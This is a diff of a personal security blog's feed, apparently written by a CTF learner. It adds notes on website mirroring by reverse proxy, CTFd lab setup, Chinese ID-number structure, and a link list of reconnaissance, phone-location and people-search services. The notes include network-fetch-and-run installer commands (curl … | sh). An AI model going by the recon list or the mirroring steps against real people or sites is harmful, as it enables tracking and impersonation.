@@ -51,4 +51,360 @@
     
   </entry>
   
+  <entry>
+    <title>udf提权</title>
+    <link href="https://axingde.github.io/2020/11/23/udf%E6%8F%90%E6%9D%83/"/>
+    <id>https://axingde.github.io/2020/11/23/udf提权/</id>
+    <published>2020-11-23T10:07:01.000Z</published>
+    <updated>2020-11-23T10:07:01.111Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>建立网站镜像</title>
+    <link href="https://axingde.github.io/2020/11/08/%E5%BB%BA%E7%AB%8B%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F/"/>
+    <id>https://axingde.github.io/2020/11/08/建立网站镜像/</id>
+    <published>2020-11-08T11:59:07.000Z</published>
+    <updated>2020-11-08T12:37:27.004Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>1台服务器</p><p>CentOS 7.3.1611 64位</p><p>宝塔面板7.4.5</p><p>Nginx -Tengine2.2.3</p><h2 id="1-建立"><a href="#1-建立" class="headerlink" title="1.建立"></a>1.建立</h2><p>前提一台服务器已安装好centos系统并且通过连接工具（xshell或别的）与服务器建立连接。</p><p>安装bt面板</p><p>官方网址：<a href="https://www.bt.cn/">https://www.bt.cn/</a></p><p>在命令行输入：</p><pre class="line-numbers language-none"><code class="language-none">yum install -y wget &amp;&amp; wget -O install.sh http:&#x2F;&#x2F;download.bt.cn&#x2F;install&#x2F;install_6.0.sh &amp;&amp; sh install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/11/08/m689xSiDhNGaOFM.png" alt="image-20201108201701039"></p><p>点击确定</p><p>安装成功后输入显示的网址以及用户名和密码登陆宝塔控制面板</p><h2 id="2-安装nginx"><a href="#2-安装nginx" class="headerlink" title="2.安装nginx"></a>2.安装nginx</h2><p><img src="https://i.loli.net/2020/11/08/KwYiNzxfqIsMpA6.png" alt="image-20201108202041893"></p><h2 id="3-创建站点"><a href="#3-创建站点" class="headerlink" title="3.创建站点"></a>3.创建站点</h2><p>（域名处可填写自己购买的域名，若无域名填写公网ip）</p><p><img src="https://i.loli.net/2020/11/08/aHZS5EQk7XUvPnA.png" alt="image-20201108202158255"></p><h2 id="4-创建反向代理，设置被镜像的网站"><a href="#4-创建反向代理，设置被镜像的网站" class="headerlink" title="4.创建反向代理，设置被镜像的网站"></a>4.创建反向代理，设置被镜像的网站</h2><p><img src="https://i.loli.net/2020/11/08/EB2OW7bjzwXaMVY.png" alt="image-20201108202602670"></p><p><img src="https://i.loli.net/2020/11/08/6C5RtnNjXTBWdOA.png" alt="image-20201108202818198"></p><p>点击提交即成功</p><h2 id="5-访问自己的域名或公网IP"><a href="#5-访问自己的域名或公网IP" class="headerlink" title="5.访问自己的域名或公网IP"></a>5.访问自己的域名或公网IP</h2><p><img src="https://i.loli.net/2020/11/08/sC6QnkDoHFT9mgi.png" alt="image-20201108203112321"></p><h2 id="建立镜像网站过程中遇到的问题"><a href="#建立镜像网站过程中遇到的问题" class="headerlink" title="建立镜像网站过程中遇到的问题"></a>建立镜像网站过程中遇到的问题</h2><p>第四步点击提交后报错：</p><pre class="line-numbers language-none"><code class="language-none">nginx: configuration file &#x2F;www&#x2F;server&#x2F;nginx&#x2F;conf&#x2F;nginx.conf test failed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/11/08/nKbD8FOj9If7Jlw.png" alt="image-20201108203707644"></p><p>解决方法：</p><p>在<code>nginx.conf</code>里的<code>http</code>中加上这句话：</p><pre class="line-numbers language-none"><code class="language-none">limit_conn_zone $binary_remote_addr zone&#x3D;addr:10m;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/11/08/tUcoXHlAnCgWar8.png" alt="image-20201108203552739"></p><p>然后在重新操作第四步。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;1台服务器&lt;/p&gt;
+&lt;p&gt;CentOS 7.3.1611 64位&lt;/p&gt;
+&lt;p&gt;宝塔面板7.4.5&lt;/p&gt;
+&lt;p&gt;Nginx -Tengin
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="网站镜像" scheme="https://axingde.github.io/tags/%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>武器库</title>
+    <link href="https://axingde.github.io/2020/11/05/%E6%AD%A6%E5%99%A8%E5%BA%93/"/>
+    <id>https://axingde.github.io/2020/11/05/武器库/</id>
+    <published>2020-11-05T11:08:36.000Z</published>
+    <updated>2020-11-05T13:02:13.289Z</updated>
+    
+    <content type="html"><![CDATA[<p>基于IP查询</p><p>1.<a href="https://mp.weixin.qq.com/s/tx7MYO2v0WRhqYZ66v0o4w">LBS基站查询</a></p><p>2.<a href="http://www.cnblogs.com/cellmap/p/4059881.html">cellmap基站API</a></p><p>3.<a href="https://ip.rtbasia.com/">rtbasia ip定位,真人识别</a></p><p>4.<a href="https://www.ipip.net/ip.html">(ipip)ip精准定位</a></p><p>5.<a href="https://www.ipplus360.com/search/ip/">(ipplus360)ip精准定位</a></p><p>手机信息</p><p>1.<a href="http://www.ip138.com:8080/search.asp">归属地查询</a></p><p>HLR手机位置归属查询</p><p>1.<a href="https://www.my-cool-sms.com/en/hlr-lookup-api">my-cool-sms</a></p><p>2.<a href="http://numberportabilitylookup.com/">numberportabilitylookup</a></p><p>3.<a href="https://www.hlr-lookups.com/">hlr-lookups</a></p><p>4.<a href="https://www.neutrinoapi.com/api/hlr-lookup/">neutrinoapi</a></p><p>5.<a href="https://bsg.world/en/products/hlr-lookup/">bsg.world</a></p><p>6.<a href="https://www.hlrlookup.com/">hlrlookup</a></p><p>7.<a href="https://clients.txtnation.com/hc/en-us/articles/218713508-HLR-Lookup">clients.txtnation</a></p><p>端口扫描</p><p>1.<a href="http://www.t1shopper.com/tools/port-scan/">port-scan</a></p><p>2.<a href="https://hackertarget.com/nmap-online-port-scanner/">hackertarget</a></p><p>3.<a href="http://tool.chinaz.com/port/">站长工具端口扫描</a></p><p>cdn查询</p><p>1.<a href="http://www.cdnplanet.com/tools/cdnfinder/">CDN Finder</a></p><p>二级域名</p><p>1.<a href="http://www.webscan.cc/">webscan</a></p><p>2.<a href="https://dnsdumpster.com/">dnsdumpster</a></p><p>旁站查询</p><p>1.<a href="http://www.yougetsignal.com/tools/web-sites-on-web-server/">You Get Signal</a></p><p>2.<a href="http://www.robtex.com/">robtex</a></p><p>ICP备案</p><p>1.<a href="http://www.beianbeian.com/">ICP备案查询网</a></p><p>指纹识别</p><p>1.<a href="http://yunsee.cn/">云悉指纹</a></p><p>2.<a href="http://finger.tidesec.net/">潮汐指纹</a></p><p>dns记录</p><p>1.<a href="http://www.siteinfotool.com/">Site Info Tool</a></p><p>2.<a href="http://toolbar.netcraft.com/site_report">netcraft</a></p><p>3.<a href="https://dnsdumpster.com/">dnsdumpster</a></p><p>4.<a href="https://viewdns.info/iphistory/">viewdns</a></p><p>5.<a href="https://asm.ca.com/">asm</a></p><p>社工</p><p>1.<a href="https://haveibeenpwned.com/">haveibeenpwned</a></p><p>2.<a href="http://bugmenot.com/">BugMeNot</a></p><p>Email邮箱</p><p>1.<a href="http://com.lullar.com/">lullar</a></p><p>找人</p><p>1.<a href="http://arnetminer.org/">AMiner</a></p><p>2.<a href="http://www.yatedo.com/">yatedo</a></p><p>3.<a href="http://www.spokeo.com/">spokeo</a></p><p>4.<a href="http://www.corporationwiki.com/">corporationwiki</a></p><p>5.<a href="http://www.nndb.com/">nndb</a></p><p>6.<a href="http://www.beenverified.com/">beenverified</a></p><p>图片查询</p><p>1.<a href="http://shitu.baidu.com/">百度识图</a></p><p>2.<a href="http://exif.regex.info/exif.cgi">exif info</a></p><p>航班信息查询</p><p>1.<a href="http://flightaware.com/">FlightAware</a></p><p>图片exif信息查看(经纬度)</p><p>1.<a href="https://exif.tuchong.com/">图虫EXIF查看器alpha版</a></p><p>短信验证</p><p>1.<a href="http://receivefreesms.com/">Receive SMS Online</a></p><p>2.<a href="https://www.pdflibr.com/">云短信</a></p><p><a href="http://www.safe6.cn/tools">from</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;基于IP查询&lt;/p&gt;
+&lt;p&gt;1.&lt;a href=&quot;https://mp.weixin.qq.com/s/tx7MYO2v0WRhqYZ66v0o4w&quot;&gt;LBS基站查询&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2.&lt;a href=&quot;http://www.cnblogs.com/cellmap/
+      
+    
+    </summary>
+    
+      <category term="武器库" scheme="https://axingde.github.io/categories/%E6%AD%A6%E5%99%A8%E5%BA%93/"/>
+    
+    
+      <category term="web安全工具" scheme="https://axingde.github.io/tags/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Git中文显示编码问题</title>
+    <link href="https://axingde.github.io/2020/11/04/Git%E4%B8%AD%E6%96%87%E6%98%BE%E7%A4%BA%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/"/>
+    <id>https://axingde.github.io/2020/11/04/Git中文显示编码问题/</id>
+    <published>2020-11-04T01:55:07.000Z</published>
+    <updated>2020-11-04T02:00:24.323Z</updated>
+    
+    <content type="html"><![CDATA[<p>刚装了台新机器，Git 显示总是呈现这样的样子</p><pre class="line-numbers language-none"><code class="language-none">&quot;\346\265\213\350\257\225.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解决方法：</p><pre class="line-numbers language-none"><code class="language-none">git config --global core.quotepath false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;刚装了台新机器，Git 显示总是呈现这样的样子&lt;/p&gt;
+&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&amp;quot;\346\265\213\350\257\225.txt&amp;quot;&lt;
+      
+    
+    </summary>
+    
+      <category term="杂项" scheme="https://axingde.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
+    
+    
+      <category term="git" scheme="https://axingde.github.io/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>身份证各数字的含义</title>
+    <link href="https://axingde.github.io/2020/11/01/%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%90%84%E6%95%B0%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89/"/>
+    <id>https://axingde.github.io/2020/11/01/身份证各数字的含义/</id>
+    <published>2020-11-01T13:41:44.000Z</published>
+    <updated>2020-11-01T14:09:10.764Z</updated>
+    
+    <content type="html"><![CDATA[<p>现在身份证号码有15位的和18位的，现在通用的是18位的，身份证各位数字都有其含义，15位身份证也是可以转化成18位的。</p><p>15位身份证号码各位数字含义：15位数字按从左到右数依次表位1-15位，1-6位出生地编码，7-8位出生年份，9-10位出生月份，11-12位出生日期，13-14位出生顺序编号，15位性别标号（奇数为男性，偶数为女性）。</p><p>18位身份证号码各位数字含义：现在身份证号码基本都升级为18位了，18位数字按从左到右数依次表位1-18位，，1-6位出生地编码，7-10位出生年份，11-12位出生月份，13-14位出生日期，15-16位出生顺序编号，17位性别标号，18位效验码。</p><p><img src="https://i.loli.net/2020/11/01/okbBQEduDs318pr.png" alt="image-20201101220855416"></p><p>身份证第18位（校验码）的计算方法：</p><p>　　1、将前面的身份证号码17位数分别乘以不同的系数。从第一位到第十七位的系数分别为：7－9－10－5－8－4－2－1－6－3－7－9－10－5－8－4－2。</p><p>　　2、将这17位数字和系数相乘的结果相加。</p><p>　　3、用加出来和除以11，看余数是多少？</p><p>　　4、余数只可能有0－1－2－3－4－5－6－7－8－9－10这11个数字。其分别对应的最后一位身份证的号码为1－0－X－9－8－7－6－5－4－3－2。</p><p>　　5、通过上面得知如果余数是2，就会在身份证的第18位数字上出现罗马数字的Ⅹ。如果余数是10，身份证的最后一位号码就是2。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;现在身份证号码有15位的和18位的，现在通用的是18位的，身份证各位数字都有其含义，15位身份证也是可以转化成18位的。&lt;/p&gt;
+&lt;p&gt;15位身份证号码各位数字含义：15位数字按从左到右数依次表位1-15位，1-6位出生地编码，7-8位出生年份，9-10位出生月份，11-1
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="身份证" scheme="https://axingde.github.io/tags/%E8%BA%AB%E4%BB%BD%E8%AF%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>创建web题目</title>
+    <link href="https://axingde.github.io/2020/10/27/%E5%88%9B%E5%BB%BAweb%E9%A2%98%E7%9B%AE/"/>
+    <id>https://axingde.github.io/2020/10/27/创建web题目/</id>
+    <published>2020-10-27T13:04:52.000Z</published>
+    <updated>2020-10-27T13:09:25.227Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1-非web题放置"><a href="#1-非web题放置" class="headerlink" title="1.非web题放置"></a>1.非web题放置</h2><h3 id="1-放置题目"><a href="#1-放置题目" class="headerlink" title="1.放置题目"></a>1.放置题目</h3><p>登陆创建的管理员账号后，然后点击右上角 Admin panel -&gt; Challenges ,然后点击challenges旁边的+号</p><p><img src="https://i.loli.net/2020/10/26/LYW3VPXe94jukGm.png" alt="image-20201026214337538"></p><p>然后点击create</p><p><img src="https://i.loli.net/2020/10/26/NftCoBvGSDEXusV.png" alt="image-20201026214833073"></p><p>然后题目创建成功</p><p><img src="https://i.loli.net/2020/10/26/cbhCkxKj7JPLIGr.png" alt="image-20201026215251902"></p><p>但是这种方式大多数类型题目，web题无法通过此方式创建</p><h2 id="2-使用github上web"><a href="#2-使用github上web" class="headerlink" title="2.使用github上web"></a>2.使用github上web</h2><pre class="line-numbers language-none"><code class="language-none">#安装最新版本的docker curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh# 运行docker服务service docker start# 安装docker composepip install docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-CTF赛题环境"><a href="#3-CTF赛题环境" class="headerlink" title="3.CTF赛题环境"></a>3.CTF赛题环境</h3><p>github上有许多CTF题库的开源仓库，但有些整理的未必好，为了遵守容易部署的原则，我选择了CTFTraining <a href="https://github.com/CTFTraining/CTFTraining">https://github.com/CTFTraining/CTFTraining</a></p><p>1.下载CTFTraining中的题库，这里要注意CTFTraining整个项目较大，题目建议一个个下，有选择性的拉取，下面以拉取第一个题目为例</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">mkdir CTFTrainingcd CTFTraininggit clone https:&#x2F;&#x2F;github.com&#x2F;CTFTraining&#x2F;0ctf_2016_unserialize.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.修改docker-compose.yml文件，其配置文件的结构其他题目也基本是下面这个结构：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text"># 0ctf 2016 piapiapiaversion: &quot;2&quot;services:  web:    build: .    image: ctftraining&#x2F;0ctf_2016_unserialize    environment:      - FLAG&#x3D;flag&#123;test_flag&#125;    restart: always    ports:      - &quot;150.158.166.214:8090:80&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处需要修改两个地方：一个是flag的值，写一个自己喜欢的字符串即可，另一个地方是下面的地址和端口号，地址改为0.0.0.0 端口号选一个未被占用的即可。例如：服务器公网IP:8090:80</p><p>3.启动改题目</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cd 0ctf_2016_unserializedocker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4.访问和配置CTFd的Challenge 访问<a href="http://150.158.166.214:8090">http://150.158.166.214:8090</a> （此处改成自己的ip和端口号并且安全组需开放此端口），成功能显示页面即可。 进入刚刚搭建好的CTFd中Admin-&gt;Challenges，添加一个新的挑战，类型选standard， 填写好题目名字、内容和分值等。</p><p>5.配置flag 进入到刚刚创建的挑战中，在左侧填上刚刚配置好的flags</p><h2 id="3-自己设计web题目放置CTFd上"><a href="#3-自己设计web题目放置CTFd上" class="headerlink" title="3.自己设计web题目放置CTFd上"></a>3.自己设计web题目放置CTFd上</h2><h3 id="1-使用静态靶场放置web题"><a href="#1-使用静态靶场放置web题" class="headerlink" title="1.使用静态靶场放置web题"></a>1.使用静态靶场放置web题</h3><p>把web题放置另一服务器上，放置链接然后访问（这种方式放置题目简单，但是消耗资源。）</p><h3 id="2-使用动态靶场放置web题"><a href="#2-使用动态靶场放置web题" class="headerlink" title="2.使用动态靶场放置web题"></a>2.使用动态靶场放置web题</h3><p>使用赵师傅的插件来完成目标，参考赵师傅博客</p><p><a href="https://www.zhaoj.in/read-6333.html#_Direct_Frp">https://www.zhaoj.in/read-6333.html#_Direct_Frp</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;1-非web题放置&quot;&gt;&lt;a href=&quot;#1-非web题放置&quot; class=&quot;headerlink&quot; title=&quot;1.非web题放置&quot;&gt;&lt;/a&gt;1.非web题放置&lt;/h2&gt;&lt;h3 id=&quot;1-放置题目&quot;&gt;&lt;a href=&quot;#1-放置题目&quot; class=&quot;head
+      
+    
+    </summary>
+    
+      <category term="web" scheme="https://axingde.github.io/categories/web/"/>
+    
+    
+      <category term="靶场" scheme="https://axingde.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用centos7搭建CTFd靶场</title>
+    <link href="https://axingde.github.io/2020/10/26/%E4%BD%BF%E7%94%A8centos7%E6%90%AD%E5%BB%BACTFd%E9%9D%B6%E5%9C%BA/"/>
+    <id>https://axingde.github.io/2020/10/26/使用centos7搭建CTFd靶场/</id>
+    <published>2020-10-26T10:52:59.000Z</published>
+    <updated>2020-10-26T14:25:57.116Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>腾讯云服务器 1核1G 40GB</p><p>系统镜像 centos7.6</p><h2 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h2><pre class="line-numbers language-none"><code class="language-none">yum provides gityum -y install git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-安装pip"><a href="#2-安装pip" class="headerlink" title="2.安装pip"></a>2.安装pip</h2><p>CentOS默认python2.7.5环境，不支持pip</p><pre class="line-numbers language-none"><code class="language-none">[root@localhost ~]# python -VPython 2.7.5[root@localhost ~]# pip -V-bash: pip: 未找到命令[root@localhost ~]# [root@localhost ~]# yum -y install python-pip已加载插件：fastestmirrorLoading mirror speeds from cached hostfile没有可用软件包 python-pip。错误：无须任何处理[root@localhost ~]#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装python3</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># yum -y install python3</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># python3 -V</span>Python <span class="token number">3.6</span>.8<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># </span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># pip3 -V</span>pip <span class="token number">9.0</span>.3 from /usr/lib/python3.6/site-packages <span class="token punctuation">(</span>python <span class="token number">3.6</span><span class="token punctuation">)</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pip3版本太低，需要升级，不升级会导致安装报错</p><p>升级pip3之前先把pypi镜像源更换为国内（阿里）源，不然升级pip3会出错，报错网络不可达，由于在 ~/ 目录下没有.pip目录，故创建</p><p>（我用的腾讯云服务器安装pip3之后自动生成不需要下面操作）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># mkdir .pip</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># </span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ls -a</span><span class="token builtin class-name">.</span>   anaconda-ks.cfg  .bash_logout   .bashrc  .pip             .tcshrc<span class="token punctuation">..</span>  .bash_history    .bash_profile  .cshrc   .python_history  .viminfo<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cd .pip/</span><span class="token punctuation">[</span>root@localhost .pip<span class="token punctuation">]</span><span class="token comment"># ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编辑配置文件 pip.conf</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost .pip<span class="token punctuation">]</span><span class="token comment"># vim pip.conf</span><span class="token punctuation">[</span>root@localhost .pip<span class="token punctuation">]</span><span class="token comment"># </span><span class="token punctuation">[</span>root@localhost .pip<span class="token punctuation">]</span><span class="token comment"># cat pip.conf </span><span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> https://mirrors.aliyun.com/pypi/simple/<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host<span class="token operator">=</span>mirrors.aliyun.com<span class="token punctuation">[</span>root@localhost .pip<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时再升级pip3<br>pip3 install –upgrade pip</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># pip3 install --upgrade pip</span>WARNING: Running pip <span class="token function">install</span> with root privileges is generally not a good idea. Try <span class="token variable"><span class="token variable">`</span>pip3 <span class="token function">install</span> --user<span class="token variable">`</span></span> instead.Collecting pip  Downloading https://mirrors.aliyun.com/pypi/packages/43/84/23ed6a1796480a6f1a2d38f2802901d078266bda38388954d01d3f2e821d/pip-20.1.1-py2.py3-none-any.whl <span class="token punctuation">(</span><span class="token number">1</span>.5MB<span class="token punctuation">)</span>    <span class="token number">100</span>% <span class="token operator">|</span>████████████████████████████████<span class="token operator">|</span> <span class="token number">1</span>.5MB <span class="token number">30</span>.5MB/s Installing collected packages: pipSuccessfully installed pip-20.1.1<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功升级pip3</p><p>此时再查看pip版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># pip -V</span>pip <span class="token number">20.1</span>.1 from /usr/local/lib/python3.6/site-packages/pip <span class="token punctuation">(</span>python <span class="token number">3.6</span><span class="token punctuation">)</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-安装Flask"><a href="#3-安装Flask" class="headerlink" title="3.安装Flask"></a>3.安装Flask</h2><p>pip install Flask</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># pip install Flask</span>Looking <span class="token keyword">in</span> indexes: https://mirrors.aliyun.com/pypi/simple/Collecting Flask  Downloading https://mirrors.aliyun.com/pypi/packages/f2/28/2a03252dfb9ebf377f40fba6a7841b47083260bf8bd8e737b0c6952df83f/Flask-1.1.2-py2.py3-none-any.whl <span class="token punctuation">(</span><span class="token number">94</span> kB<span class="token punctuation">)</span>     <span class="token operator">|</span>████████████████████████████████<span class="token operator">|</span> <span class="token number">94</span> kB <span class="token number">1.6</span> MB/s Collecting Werkzeug<span class="token operator">></span><span class="token operator">=</span><span class="token number">0.15</span>  Downloading https://mirrors.aliyun.com/pypi/packages/cc/94/5f7079a0e00bd6863ef8f1da638721e9da21e5bacee597595b318f71d62e/Werkzeug-1.0.1-py2.py3-none-any.whl <span class="token punctuation">(</span><span class="token number">298</span> kB<span class="token punctuation">)</span>     <span class="token operator">|</span>████████████████████████████████<span class="token operator">|</span> <span class="token number">298</span> kB <span class="token number">5.1</span> MB/s Collecting click<span class="token operator">></span><span class="token operator">=</span><span class="token number">5.1</span>  Downloading https://mirrors.aliyun.com/pypi/packages/d2/3d/fa76db83bf75c4f8d338c2fd15c8d33fdd7ad23a9b5e57eb6c5de26b430e/click-7.1.2-py2.py3-none-any.whl <span class="token punctuation">(</span><span class="token number">82</span> kB<span class="token punctuation">)</span>     <span class="token operator">|</span>████████████████████████████████<span class="token operator">|</span> <span class="token number">82</span> kB <span class="token number">401</span> kB/s Collecting itsdangerous<span class="token operator">></span><span class="token operator">=</span><span class="token number">0.24</span>  Downloading https://mirrors.aliyun.com/pypi/packages/76/ae/44b03b253d6fade317f32c24d100b3b35c2239807046a4c953c7b89fa49e/itsdangerous-1.1.0-py2.py3-none-any.whl <span class="token punctuation">(</span><span class="token number">16</span> kB<span class="token punctuation">)</span>Collecting Jinja<span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token operator">=</span><span class="token number">2.10</span>.1  Downloading https://mirrors.aliyun.com/pypi/packages/30/9e/f663a2aa66a09d838042ae1a2c5659828bb9b41ea3a6efa20a20fd92b121/Jinja2-2.11.2-py2.py3-none-any.whl <span class="token punctuation">(</span><span class="token number">125</span> kB<span class="token punctuation">)</span>     <span class="token operator">|</span>████████████████████████████████<span class="token operator">|</span> <span class="token number">125</span> kB <span class="token number">24.4</span> MB/s Collecting MarkupSafe<span class="token operator">></span><span class="token operator">=</span><span class="token number">0.23</span>  Downloading https://mirrors.aliyun.com/pypi/packages/b2/5f/23e0023be6bb885d00ffbefad2942bc51a620328ee910f64abe5a8d18dd1/MarkupSafe-1.1.1-cp36-cp36m-manylinux1_x86_64.whl <span class="token punctuation">(</span><span class="token number">27</span> kB<span class="token punctuation">)</span>Installing collected packages: Werkzeug, click, itsdangerous, MarkupSafe, Jinja2, FlaskSuccessfully installed Flask-1.1.2 Jinja2-2.11.2 MarkupSafe-1.1.1 Werkzeug-1.0.1 click-7.1.2 itsdangerous-1.1.0<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-克隆CTFd"><a href="#4-克隆CTFd" class="headerlink" title="4.克隆CTFd"></a>4.克隆CTFd</h2><p>查看git版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># git --version</span><span class="token function">git</span> version <span class="token number">1.8</span>.3.1<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建CTFd目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cd /usr/local/</span><span class="token punctuation">[</span>root@localhost local<span class="token punctuation">]</span><span class="token comment"># mkdir CTFd</span><span class="token punctuation">[</span>root@localhost local<span class="token punctuation">]</span><span class="token comment"># ls</span>bin  CTFd  etc  games  include  lib  lib64  libexec  sbin  share  src<span class="token punctuation">[</span>root@localhost local<span class="token punctuation">]</span><span class="token comment"># cd CTFd/</span><span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment"># pwd</span>/usr/local/CTFd<span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始克隆<br>git clone <a href="https://github.com/CTFd/CTFd.git">https://github.com/CTFd/CTFd.git</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost CTFd<span class="token punctuation">]</span><span class="token comment"># git clone https://github.com/CTFd/CTFd.git</span>正克隆到 <span class="token string">'CTFd'</span><span class="token punctuation">..</span>.remote: Enumerating objects: <span class="token number">216</span>, done.remote: Counting objects: <span class="token number">100</span>% <span class="token punctuation">(</span><span class="token number">216</span>/216<span class="token punctuation">)</span>, done.remote: Compressing objects: <span class="token number">100</span>% <span class="token punctuation">(</span><span class="token number">132</span>/132<span class="token punctuation">)</span>, done.remote: Total <span class="token number">10336</span> <span class="token punctuation">(</span>delta <span class="token number">112</span><span class="token punctuation">)</span>, reused <span class="token 